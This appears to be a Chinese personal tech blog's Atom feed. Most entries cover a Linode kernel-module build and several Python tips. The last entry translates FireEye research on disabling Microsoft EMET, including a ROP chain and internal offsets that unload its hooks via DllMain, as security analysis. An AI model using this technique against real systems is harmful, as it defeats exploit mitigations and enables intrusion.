<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[雪地]]></title>
  <link href="http://yinzo.github.io/atom.xml" rel="self"/>
  <link href="http://yinzo.github.io/"/>
  <updated>2016-12-28T00:03:18+08:00</updated>
  <id>http://yinzo.github.io/</id>
  <author>
    <name><![CDATA[]]></name>
    
  </author>
  <generator uri="http://www.mweb.im/">MWeb</generator>
  
  <entry>
    <title type="html"><![CDATA[在 Linode 上编译 hybla 模块]]></title>
    <link href="http://yinzo.github.io/14828521678770.html"/>
    <updated>2016-12-27T23:22:47+08:00</updated>
    <id>http://yinzo.github.io/14828521678770.html</id>
    <content type="html"><![CDATA[
<p>考试复习期间，不想复习，搞搞其他东西散散心，发现shadowsocks 有关于 TCP Fast Open 的更新，看说明的过程还发现了官方的速度优化指南，尝试优化自己的 ss 速度，然而报错。</p>

<p>执行到这一步时运行出错</p>

<pre><code class="language-sh">sysctl --system
</code></pre>

<pre><code class="language-sh">...
sysctl: setting key &quot;net.ipv4.tcp_congestion_control&quot;: No such file or directory
net.ipv4.tcp_congestion_control = hybla
* Applying /etc/sysctl.conf ...
</code></pre>

<span id="more"></span><!-- more -->

<p>Google 一番后发现是缺少 tcp_hybla 模块，需要自己手动编译。引用一下 <a href="https://plus.google.com/+BoluoKING/posts/dLyYhBf3mwp">https://plus.google.com/+BoluoKING/posts/dLyYhBf3mwp</a> 的科普</p>

<blockquote>
<p>中美之间的线路质量不是很好，rtt较长且时常丢包。TCP的设计目的是解决不可靠线路上可靠传输的问题，即为了解决丢包，但丢包却使TCP传输速度大幅下降。HTTP协议在传输层使用的是TCP协议，所以网页下载的速度就取决于TCP单线程下载的速度（因为网页就是单线程下载的）。丢包使得TCP传输速度大幅下降的主要原因是丢包重传机制，控制这一机制的就是TCP拥塞控制算法。<br/>
Linux内核中提供了若干套TCP拥塞控制算法，这些算法各自适用于不同的环境。</p>

<p>1）reno是最基本的拥塞控制算法，也是TCP协议的实验原型。<br/>
2）bic适用于rtt较高但丢包极为罕见的情况，比如北美和欧洲之间的线路，这是2.6.8到2.6.18之间的Linux内核的默认算法。<br/>
3）cubic是修改版的bic，适用环境比bic广泛一点，它是2.6.19之后的linux内核的默认算法。<br/>
4）hybla适用于高延时、高丢包率的网络，比如卫星链路——同样适用于中美之间的链路。<br/>
我们需要做的工作就是将TCP拥塞控制算法改为hybla算法，并且优化TCP参数。</p>
</blockquote>

<p>于是又开始找 hybla 模块的编译指南，参考了这两篇文章，并且修改了一下不太明确的地方，写个修改版的指南吧。</p>

<ul>
<li><a href="https://moonagic.com/linode-setup-hybla-htcp/">Linode编译hybla htcp模块</a></li>
<li><a href="http://www.777s.me/linode-hybla-htcp.html">Linode编译hybla htcp拥塞控制算法模块</a></li>
</ul>

<h2 id="toc_0">编译过程</h2>

<h3 id="toc_1">查看自己 vps 内核版本：</h3>

<pre><code class="language-sh">$ uname -a
4.8.3-x86_64-linode76
</code></pre>

<h3 id="toc_2">下载对应版本的内核源码</h3>

<p>在这里下载 <a href="https://www.kernel.org/pub/linux/kernel/">https://www.kernel.org/pub/linux/kernel/</a></p>

<p>我这里是 <code>4.8.3</code>，于是进入 <code>v4.x</code> 目录，向下翻即找到了，复制文件地址，在vps上 <code>wget</code> 下载下来</p>

<pre><code class="language-sh">mkdir kernel  
cd kernel  
wget https://www.kernel.org/pub/linux/kernel/v4.x/linux-4.8.3.tar.gz 
tar xzvf linux-4.8.3.tar.gz
</code></pre>

<p>注意修改对应的下载地址和文件名</p>

<h3 id="toc_3">安装内核编译和工具</h3>

<pre><code class="language-sh">apt-get install build-essential libncurses5-dev module-init-tools
</code></pre>

<h3 id="toc_4">配置内核编译文件</h3>

<pre><code class="language-sh">cd linux-4.8.3  
zcat /proc/config.gz &gt; .config
</code></pre>

<p>然后用你喜欢的编辑器编辑 <code>.config</code> 文件，查找 <code>CONFIG_TCP_CONG_CUBIC=y</code>，在这一行下面增加一行</p>

<pre><code>CONFIG_TCP_CONG_HYBLA=y
</code></pre>

<p>然后编译</p>

<pre><code class="language-sh">make
</code></pre>

<p>编译耗时约15~20分钟</p>

<h3 id="toc_5">准备编译模块</h3>

<pre><code class="language-sh">cd net/ipv4/  
mv Makefile Makefile.old  
vi Makefile 
</code></pre>

<p>以下是 <code>hybla</code> 所用的 Makefile</p>

<pre><code># Makefile for tcp_hybla.ko
obj-m := tcp_hybla.o  
KDIR := /tmp/kernel/linux-4.8.3  
PWD := $(shell pwd)  
default:  
    $(MAKE) -C $(KDIR) SUBDIRS=$(PWD) modules
</code></pre>

<p>注意上面<strong>第三行 <code>KDIR := /root/kernel/linux-3.11.6</code> 要修改成自己解压的目录</strong>，并且最后一行必须以 <strong><code>tab</code></strong> 开头，<strong>不可以用空格，不可以用空格</strong>。不懂Makefile的规则，我在这里踩了坑。</p>

<h3 id="toc_6">开始编译模块</h3>

<p>这里退回到 <code>linux-4.8.3</code> 目录，我是放在 <code>/tmp/kernel</code> 内的，后面目录相关的就不提示了</p>

<pre><code class="language-sh">cd /tmp/kernel/linux-4.8.3
make modules 
</code></pre>

<h3 id="toc_7">加载模块</h3>

<pre><code class="language-sh">cd /tmp/kernel/linux-4.8.3/net/ipv4  
insmod ./tcp_hybla.ko 
</code></pre>

<p>如果遇到command not found: insmod则需要手动安装</p>

<pre><code class="language-sh">apt-get install module-init-tools  
</code></pre>

<p>如果编译的时候如果出现如下错误</p>

<pre><code class="language-sh">scripts/extract-cert.c:21:25: fatal error: openssl/bio.h: No such file or directory
</code></pre>

<p>需要源安装libssl-dev就可以了</p>

<h2 id="toc_8">后记</h2>

<p>至此就装好了hybla 模块，后面继续按照 <a href="https://github.com/shadowsocks/shadowsocks/wiki/Optimizing-Shadowsocks">优化指南</a> 优化去了</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[不要手动缓存长度]]></title>
    <link href="http://yinzo.github.io/14696108056583.html"/>
    <updated>2016-07-27T17:13:25+08:00</updated>
    <id>http://yinzo.github.io/14696108056583.html</id>
    <content type="html"><![CDATA[
<p>今天在阅读《机器学习实战》的时候，看到了这样一句描述</p>

<p><img src="media/14696108056583/IMG_0629.png" alt="IMG_0629"/></p>

<p>其中数据集是一个List。看到这里说到为了提高代码效率，特地开了一个变量来保存其长度。</p>

<span id="more"></span><!-- more -->

<p>我回忆起以前调试bug的时候，总是能看到List对象里面有一个函数<code>__len__</code>，想必Python对于这种常用函数会有所优化，对于这种集合类型的对象，如果对其长度进行缓存，这样多次调用<code>len</code>函数，就不会重复进行遍历计算了。这么简单的优化，Python必然是有做的。</p>

<p>于是去Google，原本准备搜len函数的具体实现代码，结果直接找到stackoverflow有<a href="http://stackoverflow.com/questions/29057153/does-the-len-built-in-function-iterates-through-the-collection-to-calculate-it">相关问题</a>，明确的验证了我的想法。</p>

<p><img src="media/14696108056583/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202016-07-27%2018.44.21.png" alt="屏幕快照 2016-07-27 18.44.21"/></p>

<p>对于这种类型，Python都会对其长度进行缓存。也就是说，对于len函数，只在第一次调用的时候复杂度为<code>O(N)</code>，后续调用的复杂度都是常数级的。所以，我们平时写代码的时候，可以不需要多此一举的再开一个单独的变量来缓存了。也就是说，以下代码在没有特殊需求之下，是多此一举的：</p>

<pre><code class="language-python">l = len(some_list)
</code></pre>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[使用 Python 装饰器来将普通函数加入任务队列]]></title>
    <link href="http://yinzo.github.io/14685108901937.html"/>
    <updated>2016-07-14T23:41:30+08:00</updated>
    <id>http://yinzo.github.io/14685108901937.html</id>
    <content type="html"><![CDATA[
<p>对于操作『函数对象』来说，使用 Python 装饰器是一种非常优雅，非常 Pythonic 的一个方式。而在这篇文章中，对于任何一个普通的函数，只需要在函数定义前加一个装饰器调用，即可使得这一函数被调用时自动加入特定的任务队列，成为异步调用，而不会阻塞主线程。</p>

<span id="more"></span><!-- more -->

<h2 id="toc_0">实现 Producer/Consumer 型任务队列</h2>

<pre><code class="language-python"># -*- coding: utf-8 -*-

from Queue import Queue
from threading import Thread
from collections import namedtuple

Job = namedtuple(&#39;Job&#39;, (&#39;func&#39;, &#39;args&#39;, &#39;kwargs&#39;, &#39;result_obj&#39;))
</code></pre>

<p>首先，我们先声明了一个 namedtuple ，其中包含以下几个元素：</p>

<ol>
<li><code>func</code> ：需要加入任务队列的目标函数对象</li>
<li><code>args</code> 和 <code>kwargs</code> ：目标函数对象的参数</li>
<li><code>result_obj</code> ：用于保存目标函数返回值的一个字典， 装饰器函数将目标函数加入任务队列之后，会直接返回一个<code>{&#39;result&#39;: None, &#39;done&#39;: False}</code>的字典。等到目标函数异步执行完成之后， Worker 会用返回值替换这一字典的<code>result</code>，并设置<code>done</code>为<code>True</code></li>
</ol>

<pre><code class="language-python">class Worker(Thread):

    def __init__(self, queue):
        &quot;&quot;&quot;
        :type queue: Queue
        &quot;&quot;&quot;
        super(Worker, self).__init__()
        self.queue = queue
        self._stopped = False
        self._stop_done = False

    def run(self):
        while True:
            if self._stopped is True:
                break

            task = self.queue.get()
            result = task.func(*task.args, **task.kwargs)
            task.result_obj[&#39;result&#39;] = result
            task.result_obj[&#39;done&#39;] = True

        self._stop_done = True

    def stop(self):
        self._stopped = True
        
</code></pre>

<p>Worker 和普通的 Consumer 定义基本没有区别，唯一要注意的地方是，记得要用函数返回值，替换掉任务返回值字典的<code>&#39;result&#39;</code>，并修改任务状态，即</p>

<pre><code class="language-python">task.result_obj[&#39;result&#39;] = result
task.result_obj[&#39;done&#39;] = True
</code></pre>

<pre><code class="language-python">        
class QueueHandler(object):

    def __init__(self, workers=5):
        self.job_queue = Queue()
        self.workers = [Worker(self.job_queue) for i in xrange(workers)]
        for worker in self.workers:
            worker.setDaemon(True)
            worker.start()

    def queue_up(self, func):

        def _queue_up(*args, **kwargs):
            tmp_obj = {&#39;result&#39;: None, &#39;done&#39;: False}

            self. job_queue.put(
                Job(
                    func = func,
                    args = args,
                    kwargs = kwargs,
                    result_obj=tmp_obj
                )
            )
            return tmp_obj
        return _queue_up

</code></pre>

<p>同样是比较标准的 Producer ，其中<code>queue_up</code>函数就是这次的主角了。对于目标函数，先构建一个返回值字典，然后将目标函数和参数加入任务队列，最后返回这一返回值字典。非常简单的结构，但是使用起来非常的方便。</p>

<h2 id="toc_1">实际测试</h2>

<p>这里我构造了一个用来测试的代码</p>

<pre><code class="language-python">import time, random

testQueue = QueueHandler()


class TestClass(object):

    def __init__(self):
        self.some_value = 10
        self.some_str = &quot;Empty&quot;

    @testQueue.queue_up
    def some_operation(self, jobid, some_para, another_para=&#39;blablabla&#39;):
        time.sleep(random.randrange(1,5))
        self.some_value = some_para
        self.some_str = another_para
        print &quot;ID: {} ---Now, value: {}, str: {}\n&quot;.format(jobid, self.some_value, self.some_str)
        return jobid+100000


if __name__ == &#39;__main__&#39;:
    testClass = TestClass()
    rs = []
    for i in range(10):
        rs.append(
            testClass.some_operation(i, i+1000, another_para=&#39;{0}&#39;.format(&#39;-&#39;*i))
        )
    for i in range(10):
        time.sleep(1)
        print rs
</code></pre>

<p>读者可以尝试删除掉<code>some_operation</code>函数前面的装饰器，对比有无这个装饰器对程序运行的影响。</p>

<p>可以看到，对于需要测试的<code>some_operation</code>函数，我仅仅是在其定义前加上了一个装饰器的调用，就使得这个函数的执行不会阻塞主线程了。并且对于异步调用函数的返回值，也很好的进行了保留传递。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Python 爬取中文页面时解码 UnicodeDecodeError 报错的解决]]></title>
    <link href="http://yinzo.github.io/14662517738182.html"/>
    <updated>2016-06-18T20:09:33+08:00</updated>
    <id>http://yinzo.github.io/14662517738182.html</id>
    <content type="html"><![CDATA[
<p>这个问题从我刚开始学 Python 就遇到了，结果到现在写爬虫爬中文网页时遇到这个问题依然还是得去百度一番。不过这一次，这个问题终于能够完美的解决了</p>

<p>这个问题是这样的。</p>

<p>网页的HTML中charset指定的是GB2312字符集，但是当我爬取下来之后，尝试解码后转到utf-8进行保存:</p>

<pre><code class="language-python">content = rsp.text.decode(&#39;gb2312&#39;).encode(&#39;utf8&#39;)
</code></pre>

<p>却遇到了以下报错</p>

<pre><code class="language-shell">UnicodeDecodeError: &#39;gb2312&#39; codec can&#39;t decode bytes in position 97-98: illegal multibyte sequence
</code></pre>

<span id="more"></span><!-- more -->

<p>然后按照一般处理中文网页的习惯，尝试了下按照GBK解码</p>

<pre><code class="language-python">content = rsp.text.decode(&#39;gbk&#39;).encode(&#39;utf8&#39;)
</code></pre>

<p>这次没有报错，但是解码出来的字符是乱码，说明gbk其实也不对。</p>

<p>之后通过百度找到了一个以前没有见到的回答，是个相当tricky的方法</p>

<pre><code class="language-python">content = rsp.text.encode(rsp.encoding).decode(&#39;gb2312&#39;)
</code></pre>

<p>然后就完美解决了这一个问题。</p>

<p>这里的rsp是requests的请求返回object，它的encoding是自动检测到的响应的编码。<br/>
唯一疑惑的地方是这里使用的是encode而不是decode，于是我推测，Python在把内容爬取下来的时候是作为unicode进行操作，而没有进行encode；只有在输出或者保存到文件时才会进行encode。</p>

<p>这里，由于原文字符集为gb2312，保存时我强行用gbk解码其实并没有对它进行实质上的改变，然后被强行编码成utf8进行保存，自然导致了文件中文的乱码。</p>

<p>而先进行原字符集的encode之后，才能进行正确的decode操作，输出utf8编码的str类型，之后也正确的被保存为utf8类型，问题解决。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[关于Python的logging模块初始化无效的一个小坑]]></title>
    <link href="http://yinzo.github.io/14610807170718.html"/>
    <updated>2016-04-19T23:45:17+08:00</updated>
    <id>http://yinzo.github.io/14610807170718.html</id>
    <content type="html"><![CDATA[
<p>众所周知，logging模块是一个非常方便好用的日志输出模块。但是最近的使用发现了一个小坑，记录一下，避免再次踩坑。</p>

<p>一般使用logging模块都会对其进行初始化，使用以下代码：</p>

<pre><code>    log_format = &#39;[%(levelname)s] %(asctime)s  %(filename)s line %(lineno)d: %(message)s&#39;
    date_fmt = &#39;%a, %d %b %Y %H:%M:%S&#39;
    logging.basicConfig(
        format=log_format,
        datefmt=date_fmt,
        level=log_level,
    )
</code></pre>

<span id="more"></span><!-- more -->

<p>或者，只是简单使用，可以不初始化，直接<code>logging.info(&quot;blablabla&quot;)</code></p>

<p>但是，如果当你先直接不初始化logging设置，直接输出之后，你再尝试初始化，你的设置将不会不会生效。尝试以下代码</p>

<pre><code># -*- coding: utf-8 -*-
import logging

def init_logging(log_level=logging.INFO):
    log_format = &#39;[%(levelname)s] %(asctime)s  %(filename)s line %(lineno)d: %(message)s&#39;
    date_fmt = &#39;%a, %d %b %Y %H:%M:%S&#39;
    logging.basicConfig(
        format=log_format,
        datefmt=date_fmt,
        level=log_level,
    )


if __name__ == &#39;__main__&#39;:
    logging.critical(&quot;critical&quot;)
    logging.warning(&quot;warning&quot;)
    logging.info(&quot;info&quot;)
    logging.debug(&quot;debug&quot;)

    init_logging(logging.DEBUG)
    print &quot;\n&quot;
    print &quot;initial finished.&quot;
    print &quot;\n&quot;

    logging.critical(&quot;critical&quot;)
    logging.warning(&quot;warning&quot;)
    logging.info(&quot;info&quot;)
    logging.debug(&quot;debug&quot;)
</code></pre>

<p>输出：</p>

<pre><code>CRITICAL:root:critical
WARNING:root:warning


initial finished.


CRITICAL:root:critical
WARNING:root:warning
</code></pre>

<p>输出中，因为logging默认等级为warning，所以成功输出critical和warning<br/>
但当初始化之后，其输出格式原本应该改变，并且输出等级应该变为DEBUG，但是从输出可以看到，和初始化前的输出没有任何区别，说明初始化没有生效。这一问题在官方文档中有简单提及</p>

<blockquote>
<p>The call to basicConfig() should come before any calls to debug(), info() etc. As it’s intended as a one-off simple configuration facility, only the first call will actually do anything: subsequent calls are effectively no-ops.</p>
</blockquote>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Python Decorator的一些细节]]></title>
    <link href="http://yinzo.github.io/14594228486348.html"/>
    <updated>2016-03-31T19:14:08+08:00</updated>
    <id>http://yinzo.github.io/14594228486348.html</id>
    <content type="html"><![CDATA[
<p>装饰器函数并不是在被修饰函数调用的时候才执行，而是修饰语句所在的代码块被执行的时候执行。</p>

<p>而且当一个文件（模块）被import的时候，文件内的<strong>所有</strong>装饰器就会被激活执行。因为装饰器语句相当于文件中的普通语句，而非函数声明或者类声明的一部分。</p>

<p>用以下代码方便理解：</p>

<pre><code># sample.py

def decorator_function(func):
    print &quot;executing the decorator.&quot;

    def wrapper(*args, **kwargs):
        print &quot;decorated function is executing.&quot;
        return func(*args, **kwargs)

    return wrapper


print &quot;this python file is executing.&quot;


@decorator_function
def test_function(sth):
    print &quot;blablabla&quot;+sth

test_function(&quot;yeah&quot;)
</code></pre>

<p>而当我们对一个类里面的普通函数使用修饰符进行修饰的时候，然后我们正常调用这一函数（通过实例化的对象调用），会报错提示这一函数变成了unbound method，缺少了类中函数默认的首参数self。这一问题是由于经过装饰器修饰的函数，实际上是被传递到了装饰器函数中，在这个装饰器函数中被独立调用的，而非被其原先所在的类对象调用。因此在这个装饰器函数中，没有其原来所在的类来对它进行调用，导致提示unbound method.</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[通过EMET来禁用EMET——EMET的禁用与绕过思路讲解]]></title>
    <link href="http://yinzo.github.io/14590503922928.html"/>
    <updated>2016-03-27T11:46:32+08:00</updated>
    <id>http://yinzo.github.io/14590503922928.html</id>
    <content type="html"><![CDATA[
<p>原文链接：<a href="https://www.fireeye.com/blog/threat-research/2016/02/using_emet_to_disabl.html">https://www.fireeye.com/blog/threat-research/2016/02/using_emet_to_disabl.html</a><br/>
注：本文并未由任何媒体进行翻译发布。搜索引擎中搜到的国内媒体仅为标题翻译进行推送。</p>

<p>微软的Enhanced Mitigation Experience Toolkit (EMET)是一项提高程序安全性的项目。它通过动态链接库(DLL)来运行在『受保护』的程序中，并且做一些修改来使得破解更加困难。</p>

<p>我们已经见过很多次EMET在过去的研究或者攻击中被绕过了[2, 3, 4, 5, 6, 7, 8]。通常来说，微软都是通过修改或者增加一些安全设计来搞定现有的绕过问题。 EMET的设计目的是使得破解行为的成本升高，而不是一个『傻瓜式的防破解方案』[1]。所以，只要拥有在进程空间中读写的能力，理论上我们就能搞定所有的安全设计[2]。</p>

<p>如果一个攻击者能够毫不费力地绕过EMET，那这就完全打破了EMET提高破解成本的最初目的。我们在新技术那段展示了一种禁用EMET的技术。微软在EMET5.5中打了个补丁来解决这个问题。</p>

<p>讨论完这个新技术之后，我们来说说之前提到的用来绕过或搞掉EMET的那个技术。如果你想了解关于EMET是怎么实现保护程序的，请参考附录。</p>

<span id="more"></span><!-- more -->

<h2 id="toc_0">禁用EMET的新技术</h2>

<p>EMET会根据系统的架构，来选择注入emet.dll还是emet64.dll到每一个被保护的进程中，以此在Windows API（比如kernel32.dll, ntdll.dll或者kernelbase.dll里面的函数）hook上。这些hook使得EMET能够分析所有通过关键API调用的代码，并判断他们是否合法。如果代码被认为是合法的，EMET的hook会跳回请求的API处，否则会触发一个exception。</p>

<p>但是，EMET里面存在着这样一段代码用来卸载EMET。这段代码整个禁用EMET的保护，并且把受保护的程序还原为无保护的初始状态。任何人都能简单地定位这段代码，并调用它，就能够完全禁用EMET的保护。在EMET.dll v5.2.0.1中这个函数位于0x65813中，跳到这段代码上并调用它就能弄掉EMET的hooks。</p>

<p>这一特性之所以存在，是因为emet.dll里面的用于完全退出进程的代码，为了方便，而在DllMain里面留了个入口。</p>

<p>DllMain的函数原型：</p>

<pre><code>BOOL WINAPI DllMain(
  _In_ HINSTANCE    hinstDLL,
  _In_ DWORD        fdwReason,
  _In_ LPVOID       lpvReserved
);
</code></pre>

<p>需要注意的是，第一个参数传递是DLL的地址，第二个是PE loader用来指明DLL是否被加载。如果fdwReason是1，说明DLL已经被加载或者初始化。如果是0（DLL_PROCESS_DETACH），emet.dll会初始化卸载的代码，并去除它的hook和exception处理句柄，轻而易举地停止了EMET的检查。不过这并不会把EMET从内存中移除，它只是确保了所有的保护都被禁用了。</p>

<p>这种特性可能存在与所有基于探测的产品之中，也就是那些依赖hook的并以此保证产品不被破坏，一定存在一个卸载所有保护的方法。EMET的DllMain能够通过一个Return Oriented Programming (ROP)程序来找到，并带着正确的参数跳到DllMain的对应位置，禁用保护。这个我们下一节来详细说。</p>

<pre><code>BOOL WINAPI DllMain (GetModuleHandleW(&quot;EMET.dll&quot;) ,DLL_PROCESS_DETACH , NULL);
</code></pre>

<p>GetModuleHandleW函数没有被EMET hook上，因为EMET认为它不是关键Windows API。我们使用这个函数来搞到emet.dll的地址。因为PE header位于基地址上，我们必须通过它找到DllMain的地址来传递所需的参数。</p>

<h2 id="toc_1">禁用EMET - 细节</h2>

<p>在EMET.dll v5.2.0.1中，在emet.dll的0xF2958上有一个全局变量。EMET通过这个变量作为一个structure数组指针，指向被绕过的API（detoured APIs），每一个结构体的大小为0x18 bytes，如下所示：</p>

<pre><code>struct Detoured_API {
    BOOL isActive;              // isActive field shows the hooking status, Active: 0x1
    PVOID DetouredAPIConfig;    // pointer to Detoured_API_Config structure
    PVOID nextDetouredAPI;      // pointer to the next Detoured_API structure
    DWORD valueX;
    DWORD valueY;
    DWORD valueZ;
};
</code></pre>

<p>最后三个变量和这篇文章没有关系。DetouredAPIConfig保存着一个指针指向另一个结构体Detoured_API_Config，大小是0x18 bytes.</p>

<pre><code>struct Detoured_API_Config {
    PVOID DetouredWindowsAPI;     // pointer to the detoured Windows API
    PVOID EMETDetouringFunction;    // pointer to where EMET protection implemented
    PVOID DetouredFunctionPrologue;   // pointer to the Windows API prologue
    DWORD valueX;
    DWORD valueY;
    DWORD valueZ;
}
</code></pre>

<p>注意，EMETDetouringFunction和DetouredFunctionPrologue之间总是相隔0x26 bytes，是EMET用于准备函数（检查代码的函数）所需的参数的空间。然后就会调用这一函数来进行检查。同样是在这0x26 bytes里面，EMET保存了一些meta数据，比如说detoured函数头部的大小。Detoured_API_Config 结构里面的第三个变量是DetouredFunctionPrologue。跳到这一地址将调用所有没有hook的Windows API，因为它会跳回并在执行完函数头部之后，执行剩余的所有Windows API。</p>

<p>用于去除所有EMET的hook的函数位于0x2798，如图1所示。</p>

<p><img src="http://ww4.sinaimg.cn/large/7d52f1ffjw1f2erytp63hj20r20g8tdp.jpg" alt="Figure1"/><br/>
图1： 位于0x27298上用于去除EMET hook的函数</p>

<p>为了卸载hook，位于0x27298的函数把所有Detoured_API结构都循环一次，并把对应的Detoured_API_Config结构里面的DetouredFunctionPrologue置零。然后，调用Patch_Functions（位于0x27B99的函数），给所有detoured Windows API做一些小修改。函数使用了memcpy函数(如图2)来把API函数头部代码片段复制到被绕过函数中，用于把它恢复成被绕过之前的状态。</p>

<p><img src="http://ww2.sinaimg.cn/large/7d52f1ffjw1f2erza8hyqj20i208cn0p.jpg" alt="Figure2"/><br/>
图2：删除绕过的代码<br/>
循环完所有被绕过的API并被memcpy修改之后，你可以看到所有Windows API的绕过都消失了，如图3、图4，分别是执行前后。</p>

<p><img src="http://ww3.sinaimg.cn/large/7d52f1ffjw1f2erzqpz4vj20js056jsa.jpg" alt="Figure3"/><br/>
图3：调用DllMain之前</p>

<p><img src="http://ww2.sinaimg.cn/large/7d52f1ffjw1f2es0idbffj20je04r0tf.jpg" alt="Figure4"/><br/>
图4：调用DllMain之后</p>

<p>然后EMET继续禁用EAF和EAF+的保护。在位于0x609D0的函数中，EMET置零并重新初始化CONTEXT结构，并且操作debug注册器（如图5）但是，在函数的尾部， EMET调用NtSetContextThread，使得debug注册器被置零，并由此禁用了EAF和EAF+的保护。</p>

<p><img src="http://ww2.sinaimg.cn/large/7d52f1ffjw1f2es0u7g5xj20f206n3zw.jpg" alt="Figure5"/><br/>
图5：EAF和EAF+的禁用代码</p>

<p>最后，在位于0x60FBF的函数的末尾，EMET调用了位于0x60810的RemoveVectoredExceptionHandler函数，移除了AddVectoredExceptionHandler函数里的定义的exception句柄。</p>

<h2 id="toc_2">禁用EMET-ROP的实现</h2>

<p>通过一个以前已经被打好补丁的漏洞，CVE-2012-1876，我们基于现有的漏洞做了个ROP小程序，并在EMET的保护启用时执行它。当我们的ROP小程序带着参数(EMET.dll地址, 0, 0)调用EMET.dll里面的DllMain函数，我们执行之后，所有的Windows API上的HOOK都和EAF和EAF+的保护一起消失了。</p>

<pre><code>XCHG EAX,ESP # RETN // Stack Pivot &amp; Rop Starts

POP EAX # RETN // Pop GetModuleHandle PTR from IAT

&lt;GetModuleHandleW&gt;// mshtml.dll base + offset in IAT

JMP [EAX]// Jump into GetModuleHandleW pointer

POP EBX # RETN // return address when EIP = GetModuleHandleW

EMET_STRING_PTR// Argument 1 for GetModuleHandleW i.e. EMET.dll string

//After GetModuleHandle returns esp is here while (EIP = POP EBX # RETN)

0x0000003c// 0x3c goes into EBX

ADD EBX,EAX # RETN // EAX = EMET.dll address &amp; EBX = 0x3c offset for IMAGE_DOS_HEADER::e_lfanew

XOR EBP,EBP # RETN // clear out EBP

ADD EBP,EAX # RETN // ADD EAX into Nulled EBP

ADD EAX,[EBX] # RETN // [EBX] = poi(EMET_DLL_BASE+0x3c) =&gt; EAX = offset for PE header

POP EBX # RETN // pop 0x28 in EBX

0x00000028

ADD EBX,EAX # RETN // add 0x28 with PE header offset from base address (RVA of OEP)

XOR EAX,EAX # RETN // NULL EAX

ADD EAX,EBP # RETN // ADD previously copied EMET_DLL_BASE to NULLed EAX

ADD EAX,[EBX] # RETN // ADD EMET_DLL_BASE with OEP RVA =&gt; EAX = VA of OEP

XCHG EAX,ECX # RETN // copying EAX into ECX

XOR EAX,EAX # RETN // NULL EAX

ADD EAX,EBP # RETN // copy EMET_DLL_BASE into eax

XCHG EAX,ESI # RETN // copy EMET_DLL_BASE into EAX

// ESI contains EMET_DLL_BASE &amp; ECX contains OEP address

PUSH ESI # CALL ECX # RETN // call OEP of EMET.dll with EMET_DLL_BASE on top of stack as PARAM1

0x0 // PARAM2 fdwReason == DLL_PROCESS_DETACH | 0

0x0// PARAM3 Reserved

// When Call ECX returns to RETN instruction stack top is as following

// and All hooks are gone Since EMET.dll just received a DETACH signal
</code></pre>

<h2 id="toc_3">以前的EMET绕过技术</h2>

<p>之前用于绕过EMET的技术都基于设计和实现上的失误，可能是因为一些模块和API不太安全。我们会描述一些绕过的技巧。</p>

<p>因为LoadLibrary是一个关键API，如果被『返回(return)』命令或者『跳出(jump)』命令调用，EMET4.1会抛出一个exception，但是Jared DeMott向我们展示了，通过『调用(call)』命令来调用LoadLibrary API，而不是『跳出(jump)』或『返回(return)』命令，绕过了EMET LoadLibrary的保护[2]。</p>

<p>LoadLibrary API一直被监视着，防止被用于调用UNC路径（比如说一些恶意dll）。Aaron Portnoy展示了我们能够通过MoveFile API（EMET4.0没有监视这个API）来绕过它，并下载一个能够被LoadLibrary API加载的DLL文件[3]。</p>

<p>EMET4.1的调用检查保护(Caller check protection)，是通过检查关键Windows API是否被通过调用、返回、跳出命令来调用，以防止ROP程序的执行。其中，后两种命令被广泛运用与ROP程序。DeMott展示了一个通过执行一个合法的关键API调用，来绕过调用检查保护的方法[2]。DeMott没有直接通过返回或者跳出命令来调用VirtualAlloc API（这会导致EMET抛出exception），而是在一个已被加载的模块中，使用调用命令来调用。并且，通过返回调用命令所在的地址，我们成功调用了关键Windows API而没被EMET干扰。</p>

<p>关键Windows API都位于kernel32.dll, ntdll.dll和 kernelbase.dll中。EMET3.5把前两个模块中的函数挂上hook，但是没有处理kernelbase.dll。Shahriyar Jalayeri利用这一事实来执行位于kernelbase模块中的VirtualProtect API，来使得内存可写可执行[4]。但是，在EMET4.0发布以后，函数保护应用到了几乎最低等级的关键Windows API上面。</p>

<p>Jalayeri还通过使用 <u>KUSER</u>SHARED_DATA结构(它的地址固定在0x7ffe0000上)来绕过EMET。位于0x300地址上的是一个SystemCallStub指针，指向一个执行系统级命令的函数KiFastSystemCall。由此，他能够通过指明EAX注册器里的地址（比如0x0D7指向ZwProtectVirtualMemory），来调用任何系统级调用。而且Jalayeri能够通过返回指令来修改函数头部，使其失效，导致EMET完全无效。</p>

<p>EAF通过debug注册器，在输出函数（比如kernel32.dll里的函数）的入口布下断点。这些断点，能够通过使用import access table的shellcode来绕过，而不是export acccess table，因为这个保护只能用于export acccess table。</p>

<h2 id="toc_4">以前的EMET禁用技术</h2>

<p>不像通过绕开保护的绕过技术，禁用EMET是完全关闭它的保护。比如说EAF（和一部分的EAF+）能够通过清除硬件断点（比如置零debug注册器）。Piotr Bania通过使用文档中没有写出来的的Windows API——NtSetContextThread和NtContinue来实现这一目的。但是因为EMET把NtSetContextThread hook上了，我们应该先把EMET的保护关闭，才能使用NtSetContextThread来干活。</p>

<p>Offensive Security发现EMET4.1的大部分保护行为，都会先去检查一个保存在位于emet.dll的0x0007E220位置上的一个外部全局变量；如果那个变量的值是0，那么保护函数就不会对调用代码做手脚[6]。说明这个全局变量是一个全局开关，用于打开/关闭EMET的保护，并且如果把这个变量放在了一个能够写入的位置，攻击者就能够构造一个ROP程序来把这个变量轻松地置零。</p>

<p>经过分析，我们发现EMET v2.1也在0xC410上含有相同的全局开关，由此，我们怀疑EMET从最早的版本开始就含有这一固定地址的全局开关了。这个问题直到EMET5.0的发布才修复。</p>

